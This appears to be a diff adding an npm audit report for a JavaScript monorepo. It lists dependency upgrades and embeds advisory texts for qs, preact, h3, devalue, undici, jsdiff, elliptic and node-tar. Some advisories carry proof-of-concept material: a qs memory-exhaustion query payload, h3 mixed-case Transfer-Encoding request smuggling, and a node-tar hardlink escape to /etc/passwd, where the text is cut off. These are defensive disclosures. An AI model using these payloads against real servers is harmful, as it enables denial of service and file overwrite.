@@ -1,0 +1,580 @@
+{
+  "actions": [
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1111755,
+          "path": "packages__observability>express>qs",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "qs",
+      "target": "6.14.1",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1111982,
+          "path": "packages__kgc-4d__playground>react-force-graph-3d>3d-force-graph>three-render-objects>float-tooltip>preact",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "preact",
+      "target": "10.28.2",
+      "depth": 6
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112148,
+          "path": "packages__docs>nuxt>@nuxt/devtools>@nuxt/devtools-wizard>diff",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "diff",
+      "target": "8.0.3",
+      "depth": 5
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112154,
+          "path": "packages__semantic-search>vectra>cheerio>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "undici",
+      "target": "7.18.2",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112183,
+          "path": "packages__docs>nuxt>devalue",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112188,
+          "path": "packages__docs>nuxt>devalue",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "devalue",
+      "target": "5.6.2",
+      "depth": 3
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112186,
+          "path": "packages__docs>@nuxt/eslint>@eslint/config-inspector>h3",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "h3",
+      "target": "1.15.5",
+      "depth": 4
+    },
+    {
+      "action": "update",
+      "resolves": [
+        {
+          "id": 1112255,
+          "path": "packages__docs>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ],
+      "module": "tar",
+      "target": "7.5.3",
+      "depth": 7
+    },
+    {
+      "action": "review",
+      "module": "elliptic",
+      "resolves": [
+        {
+          "id": 1112030,
+          "path": "packages__zkp>circomlibjs>ethers>@ethersproject/signing-key>elliptic",
+          "dev": false,
+          "bundled": false,
+          "optional": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "undici",
+      "resolves": [
+        {
+          "id": 1112153,
+          "path": "packages__cli>citty-test-utils>testcontainers>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        },
+        {
+          "id": 1112153,
+          "path": "packages__core>jsonld>@digitalbazaar/http-client>undici",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    },
+    {
+      "action": "review",
+      "module": "tar",
+      "resolves": [
+        {
+          "id": 1112255,
+          "path": "packages__ml-versioning>@tensorflow/tfjs-node>tar",
+          "dev": false,
+          "optional": false,
+          "bundled": false
+        }
+      ]
+    }
+  ],
+  "advisories": {
+    "1111755": {
+      "findings": [
+        {
+          "version": "6.14.0",
+          "paths": [
+            "packages__observability>express>qs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p\n- https://nvd.nist.gov/vuln/detail/CVE-2025-15284\n- https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9\n- https://github.com/advisories/GHSA-6rw7-vpxm-498p",
+      "created": "2025-12-30T21:02:54.000Z",
+      "id": 1111755,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `arrayLimit` option in qs does not enforce limits for bracket notation (`a[]=1&a[]=2`), allowing attackers to cause denial-of-service via memory exhaustion. Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ? []\n            : utils.combine([], leaf);\n    }\n}\n```\n\nThis makes bracket notation behaviour consistent with indexed notation, enforcing `arrayLimit` and converting to object when limit is exceeded (per README documentation).",
+      "reported_by": null,
+      "title": "qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-15284"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "qs",
+      "vulnerable_versions": "<6.14.1",
+      "github_advisory_id": "GHSA-6rw7-vpxm-498p",
+      "recommendation": "Upgrade to version 6.14.1 or later",
+      "patched_versions": ">=6.14.1",
+      "updated": "2025-12-30T21:02:55.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-6rw7-vpxm-498p"
+    },
+    "1111982": {
+      "findings": [
+        {
+          "version": "10.28.1",
+          "paths": [
+            "packages__kgc-4d__playground>react-force-graph-3d>3d-force-graph>three-render-objects>float-tooltip>preact"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/preactjs/preact/security/advisories/GHSA-36hm-qxxp-pg3m\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22028\n- https://github.com/advisories/GHSA-36hm-qxxp-pg3m",
+      "created": "2026-01-07T19:28:15.000Z",
+      "id": 1111982,
+      "npm_advisory_id": null,
+      "overview": "## Impact\n\n**Vulnerability Type:** HTML Injection via JSON Type Confusion\n\n**Affected Versions:** Preact 10.26.5 through 10.28.1\n\n**Severity:** Low to Medium (see below)\n\n### Who is Impacted?\n\nApplications using affected Preact versions are vulnerable if they meet **all** of the following conditions:\n\n1. **Pass unmodified, unsanitized values** from user-modifiable data sources (APIs, databases, local storage, etc.) directly into the render tree\n2. **Assume these values are strings** but the data source could return actual JavaScript objects instead of JSON strings\n3. The data source either:\n   - Fails to perform type sanitization **AND** blindly stores/returns raw objects interchangeably with strings, OR\n   - Is compromised (e.g., poisoned local storage, filesystem, or database)\n\n### Technical Details\n\nPreact includes JSON serialization protection to prevent Virtual DOM elements from being constructed from arbitrary JSON. A regression introduced in Preact 10.26.5 caused this protection to be softened. In applications where values from JSON payloads are assumed to be strings and passed unmodified to Preact as children, a specially-crafted JSON payload could be constructed that would be incorrectly treated as a valid VNode. When this chain of failures occurs it can result in HTML injection, which can allow arbitrary script execution if not mitigated by CSP or other means.\n\n**Important Notes:**\n- This regression was never present in `preact-render-to-string`\n- This is primarily an \"expanded attack surface\" issue rather than a standalone vulnerability\n- Exploitation requires either insecure API design (no type validation) or a compromised data source\n\n## Patches\n\n**Patched Versions:**\n- **10.26.10** (for 10.26.x users)\n- **10.27.3** (for 10.27.x users)\n- **10.28.2** (for 10.28.x users)\n\nUsers should upgrade to the latest patch version of whatever minor version they are on, which can be done via `npm update preact` or by installing one of the above versions directly.\n\nThe patch versions simply restore the previous strict equality checks that prevent JSON-parsed objects from being treated as valid VNodes.\n\n## Mitigations\n\nIf you cannot upgrade immediately, implement the following mitigations:\n\n- **Validate input types:** Don't accept arbitrary objects as inputs in your API and blindly store them. Enforce strict type contracts at API boundaries.\n- **Cast or validate network data:** Don't assume strings are strings if your code got them from the network. Always cast to the expected type or validate before rendering.\n- **Sanitize external data:** Validate that data from external sources (APIs, storage, databases) matches expected types before passing it to preact.\n- **Use Content Security Policy (CSP):** Implement a strict CSP to prevent inline script execution as a defense-in-depth measure.\n\n## References\n\n- **Reporter:** [YoungGeun Choi](https://github.com/Xvezda)\n- **Affected Versions:** 10.26.5 - 10.28.1\n- **Patched Versions:** 10.26.10, 10.27.3, 10.28.2\n\n## Credits\n\nPreact thanks **YoungGeun Choi (Xvezda)** for the responsible disclosure of this vulnerability and for providing detailed reproduction steps and proof-of-concept demonstrations.\n\n## Timeline\n\n- **2026-01-04:** Initial vulnerability report received\n- **2026-01-05:** Clarification requested regarding network/serialization boundary\n- **2026-01-06:** Network PoC provided demonstrating real-world exploitatibility\n- **2026-01-06:** Hotfix patches released (10.26.10, 10.27.3, 10.28.2)\n\n---\n\n**Recommendation:** All users of Preact 10.26.5 through 10.28.1 should upgrade to the appropriate patched version (10.26.10, 10.27.3, or 10.28.2) as soon as possible, and review their applications for proper input validation and sanitization practices.",
+      "reported_by": null,
+      "title": "Preact has JSON VNode Injection issue",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22028"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "preact",
+      "vulnerable_versions": ">=10.28.0 <10.28.2",
+      "github_advisory_id": "GHSA-36hm-qxxp-pg3m",
+      "recommendation": "Upgrade to version 10.28.2 or later",
+      "patched_versions": ">=10.28.2",
+      "updated": "2026-01-08T21:19:14.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-843"
+      ],
+      "url": "https://github.com/advisories/GHSA-36hm-qxxp-pg3m"
+    },
+    "1112030": {
+      "findings": [
+        {
+          "version": "6.6.1",
+          "paths": [
+            "packages__zkp>circomlibjs>ethers>@ethersproject/signing-key>elliptic"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-14505\n- https://github.com/indutny/elliptic/issues/321\n- https://www.herodevs.com/vulnerability-directory/cve-2025-14505\n- https://github.com/advisories/GHSA-848j-6mx2-7j84",
+      "created": "2026-01-08T21:30:34.000Z",
+      "id": 1112030,
+      "npm_advisory_id": null,
+      "overview": "The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.\n\nThis issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).",
+      "reported_by": null,
+      "title": "Elliptic Uses a Cryptographic Primitive with a Risky Implementation",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-14505"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "elliptic",
+      "vulnerable_versions": "<=6.6.1",
+      "github_advisory_id": "GHSA-848j-6mx2-7j84",
+      "recommendation": "None",
+      "patched_versions": "<0.0.0",
+      "updated": "2026-01-09T20:19:43.000Z",
+      "cvss": {
+        "score": 5.6,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-1240"
+      ],
+      "url": "https://github.com/advisories/GHSA-848j-6mx2-7j84"
+    },
+    "1112148": {
+      "findings": [
+        {
+          "version": "8.0.2",
+          "paths": [
+            "packages__docs>nuxt>@nuxt/devtools>@nuxt/devtools-wizard>diff"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/kpdecker/jsdiff/security/advisories/GHSA-73rr-hh4g-fpgx\n- https://github.com/kpdecker/jsdiff/pull/649\n- https://github.com/kpdecker/jsdiff/commit/15a1585230748c8ae6f8274c202e0c87309142f5\n- https://github.com/advisories/GHSA-73rr-hh4g-fpgx",
+      "created": "2026-01-14T21:34:12.000Z",
+      "id": 1112148,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nAttempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory.\n\nApplications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed).\n\nThe `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected.\n\nFinally, a second and lesser bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse.\n\n### Patches\n\nAll vulnerabilities described are fixed in v8.0.3.\n\n### Workarounds\n\nIf using a version of jsdiff earlier than v8.0.3, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.\n\n### References\n\nPR that fixed the bug: https://github.com/kpdecker/jsdiff/pull/649",
+      "reported_by": null,
+      "title": "jsdiff has a Denial of Service vulnerability in parsePatch and applyPatch",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "diff",
+      "vulnerable_versions": "<8.0.3",
+      "github_advisory_id": "GHSA-73rr-hh4g-fpgx",
+      "recommendation": "Upgrade to version 8.0.3 or later",
+      "patched_versions": ">=8.0.3",
+      "updated": "2026-01-14T21:34:16.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-73rr-hh4g-fpgx"
+    },
+    "1112153": {
+      "findings": [
+        {
+          "version": "5.29.0",
+          "paths": [
+            "packages__cli>citty-test-utils>testcontainers>undici"
+          ]
+        },
+        {
+          "version": "6.22.0",
+          "paths": [
+            "packages__core>jsonld>@digitalbazaar/http-client>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9\n- https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22036\n- https://github.com/advisories/GHSA-g9mf-h72j-4rw9",
+      "created": "2026-01-14T21:06:08.000Z",
+      "id": 1112153,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor.\n\nHowever, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation.\n\n### Patches\n\nUpgrade to 7.18.2 or 6.23.0.\n\n### Workarounds\n\nIt is possible to apply an undici interceptor and filter long `Content-Encoding` sequences manually.\n\n### References\n\n* https://hackerone.com/reports/3456148\n* https://github.com/advisories/GHSA-gm62-xv2j-4w53\n* https://curl.se/docs/CVE-2022-32206.html",
+      "reported_by": null,
+      "title": "Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22036"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "undici",
+      "vulnerable_versions": "<6.23.0",
+      "github_advisory_id": "GHSA-g9mf-h72j-4rw9",
+      "recommendation": "Upgrade to version 6.23.0 or later",
+      "patched_versions": ">=6.23.0",
+      "updated": "2026-01-14T22:33:31.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-g9mf-h72j-4rw9"
+    },
+    "1112154": {
+      "findings": [
+        {
+          "version": "7.16.0",
+          "paths": [
+            "packages__semantic-search>vectra>cheerio>undici"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodejs/undici/security/advisories/GHSA-g9mf-h72j-4rw9\n- https://github.com/nodejs/undici/commit/b04e3cbb569c1596f86c108e9b52c79d8475dcb3\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22036\n- https://github.com/advisories/GHSA-g9mf-h72j-4rw9",
+      "created": "2026-01-14T21:06:08.000Z",
+      "id": 1112154,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nThe `fetch()` API supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., Content-Encoding: gzip, br). This is also supported by the undici decompress interceptor.\n\nHowever, the number of links in the decompression chain is unbounded and the default maxHeaderSize allows a malicious server to insert thousands compression steps leading to high CPU usage and excessive memory allocation.\n\n### Patches\n\nUpgrade to 7.18.2 or 6.23.0.\n\n### Workarounds\n\nIt is possible to apply an undici interceptor and filter long `Content-Encoding` sequences manually.\n\n### References\n\n* https://hackerone.com/reports/3456148\n* https://github.com/advisories/GHSA-gm62-xv2j-4w53\n* https://curl.se/docs/CVE-2022-32206.html",
+      "reported_by": null,
+      "title": "Undici has an unbounded decompression chain in HTTP responses on Node.js Fetch API via Content-Encoding leads to resource exhaustion",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22036"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "undici",
+      "vulnerable_versions": ">=7.0.0 <7.18.2",
+      "github_advisory_id": "GHSA-g9mf-h72j-4rw9",
+      "recommendation": "Upgrade to version 7.18.2 or later",
+      "patched_versions": ">=7.18.2",
+      "updated": "2026-01-14T22:33:31.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-770"
+      ],
+      "url": "https://github.com/advisories/GHSA-g9mf-h72j-4rw9"
+    },
+    "1112183": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "packages__docs>nuxt>devalue"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/devalue/security/advisories/GHSA-g2pg-6438-jwpf\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22775\n- https://github.com/sveltejs/devalue/commit/11755849fa0634ae294a15ec0aef2f43efcad7c4\n- https://github.com/sveltejs/devalue/releases/tag/v5.6.2\n- https://github.com/advisories/GHSA-g2pg-6438-jwpf",
+      "created": "2026-01-15T22:15:18.000Z",
+      "id": 1112183,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nCertain inputs can cause `devalue.parse` to consume excessive CPU time and/or memory, potentially leading to denial of service in systems that parse input from untrusted sources. This affects applications using `devalue.parse` on externally-supplied data. The root cause is the `ArrayBuffer` hydration expecting base64 encoded strings as input, but not checking the assumption before decoding the input.\n\n## Details\n\nThe parser's `ArrayBuffer` hydration logic does not properly validate input before processing. Specially crafted inputs can cause disproportionate memory allocation or CPU usage on the receiving system.\n\n## Impact\n\nThis is a denial of service vulnerability affecting systems that use `devalue.parse` to handle data from potentially untrusted sources.\n\nAffected systems should upgrade to patched versions immediately.",
+      "reported_by": null,
+      "title": "devalue vulnerable to denial of service due to memory/CPU exhaustion in devalue.parse",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22775"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "devalue",
+      "vulnerable_versions": ">=5.1.0 <5.6.2",
+      "github_advisory_id": "GHSA-g2pg-6438-jwpf",
+      "recommendation": "Upgrade to version 5.6.2 or later",
+      "patched_versions": ">=5.6.2",
+      "updated": "2026-01-15T22:15:22.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-g2pg-6438-jwpf"
+    },
+    "1112186": {
+      "findings": [
+        {
+          "version": "1.15.4",
+          "paths": [
+            "packages__docs>@nuxt/eslint>@eslint/config-inspector>h3"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/h3js/h3/security/advisories/GHSA-mp2g-9vg9-f4cg\n- https://github.com/h3js/h3/releases/tag/v1.15.5\n- https://nvd.nist.gov/vuln/detail/CVE-2026-23527\n- https://github.com/h3js/h3/commit/618ccf4f37b8b6148bea7f36040471af45bfb097\n- https://github.com/advisories/GHSA-mp2g-9vg9-f4cg",
+      "created": "2026-01-15T20:10:51.000Z",
+      "id": 1112186,
+      "npm_advisory_id": null,
+      "overview": "I was digging into h3 v1 (specifically v1.15.4) and found a critical HTTP Request Smuggling vulnerability.\n\nBasically, `readRawBody` is doing a strict case-sensitive check for the Transfer-Encoding header. It explicitly looks for \"chunked\", but per the RFC, this header should be case-insensitive.\n\n**The Bug**: If I send a request with Transfer-Encoding: ChuNked (mixed case), h3 misses it. Since it doesn't see \"chunked\" and there's no Content-Length, it assumes the body is empty and processes the request immediately.\n\nThis leaves the actual body sitting on the socket, which triggers a classic TE.TE Desync (Request Smuggling) if the app is running behind a Layer 4 proxy or anything that doesn't normalize headers (like AWS NLB or Node proxies).\n\n**Vulnerable Code** (`src/utils/body.ts`):\n\n```js\nif (\n    !Number.parseInt(event.node.req.headers[\"content-length\"] || \"\") &&\n    !String(event.node.req.headers[\"transfer-encoding\"] ?? \"\")\n      .split(\",\")\n      .map((e) => e.trim())\n      .filter(Boolean)\n      .includes(\"chunked\") // <--- This is the issue. \"ChuNkEd\" returns false here.\n  ) {\n    return Promise.resolve(undefined);\n  }\n```\n\nI verified this locally:\n\n- Sent a `Transfer-Encoding: ChunKed` request without a closing 0 chunk.\n- Express hangs (correctly waiting for data).\n- h3 responds immediately (vulnerable, thinks body is length 0).\n\n**Impact**: Since H3/Nuxt/Nitro is often used in containerized setups behind TCP load balancers, an attacker can use this to smuggle requests past WAFs or desynchronize the socket to poison other users' connections.\n\n**Fix**: Just need to normalize the header value before checking: ` .map((e) => e.trim().toLowerCase())`",
+      "reported_by": null,
+      "title": "h3 v1 has Request Smuggling (TE.TE) issue",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-23527"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "h3",
+      "vulnerable_versions": "<=1.15.4",
+      "github_advisory_id": "GHSA-mp2g-9vg9-f4cg",
+      "recommendation": "Upgrade to version 1.15.5 or later",
+      "patched_versions": ">=1.15.5",
+      "updated": "2026-01-15T22:34:09.000Z",
+      "cvss": {
+        "score": 8.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-444"
+      ],
+      "url": "https://github.com/advisories/GHSA-mp2g-9vg9-f4cg"
+    },
+    "1112188": {
+      "findings": [
+        {
+          "version": "5.6.1",
+          "paths": [
+            "packages__docs>nuxt>devalue"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sveltejs/devalue/security/advisories/GHSA-vw5p-8cq8-m7mv\n- https://github.com/sveltejs/devalue/commit/11755849fa0634ae294a15ec0aef2f43efcad7c4\n- https://nvd.nist.gov/vuln/detail/CVE-2026-22774\n- https://github.com/sveltejs/devalue/commit/e46afa64dd2b25aa35fb905ba5d20cea63aabbf7\n- https://github.com/sveltejs/devalue/releases/tag/v5.6.2\n- https://github.com/advisories/GHSA-vw5p-8cq8-m7mv",
+      "created": "2026-01-15T18:10:15.000Z",
+      "id": 1112188,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nCertain inputs can cause `devalue.parse` to consume excessive CPU time and/or memory, potentially leading to denial of service in systems that parse input from untrusted sources. This affects applications using `devalue.parse` on externally-supplied data. The root cause is the typed array hydration expecting an `ArrayBuffer` as input, but not checking the assumption before creating the typed array.\n\n## Details\n\nThe parser's typed array hydration logic does not properly validate input before processing. Specially crafted inputs can cause disproportionate memory allocation or CPU usage on the receiving system.\n\n## Impact\n\nThis is a denial of service vulnerability affecting systems that use `devalue.parse` to handle data from potentially untrusted sources.\n\nAffected systems should upgrade to patched versions immediately.",
+      "reported_by": null,
+      "title": "Devalue is vulnerable to denial of service due to memory exhaustion in devalue.parse",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-22774"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "devalue",
+      "vulnerable_versions": ">=5.3.0 <=5.6.1",
+      "github_advisory_id": "GHSA-vw5p-8cq8-m7mv",
+      "recommendation": "Upgrade to version 5.6.2 or later",
+      "patched_versions": ">=5.6.2",
+      "updated": "2026-01-15T22:33:39.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-405"
+      ],
+      "url": "https://github.com/advisories/GHSA-vw5p-8cq8-m7mv"
+    },
+    "1112255": {
+      "findings": [
+        {
+          "version": "7.5.2",
+          "paths": [
+            "packages__docs>nuxt>@nuxt/nitro-server>nitropack>@vercel/nft>@mapbox/node-pre-gyp>tar"
+          ]
+        },
+        {
+          "version": "6.2.1",
+          "paths": [
+            "packages__ml-versioning>@tensorflow/tfjs-node>tar"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-tar/security/advisories/GHSA-8qq5-rm4j-mr97\n- https://github.com/isaacs/node-tar/commit/340eb285b6d986e91969a1170d7fe9b0face405e\n- https://github.com/advisories/GHSA-8qq5-rm4j-mr97",
+      "created": "2026-01-16T21:16:20.000Z",
+      "id": 1112255,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nThe extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.\n\n### PoC\n\nThe following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings 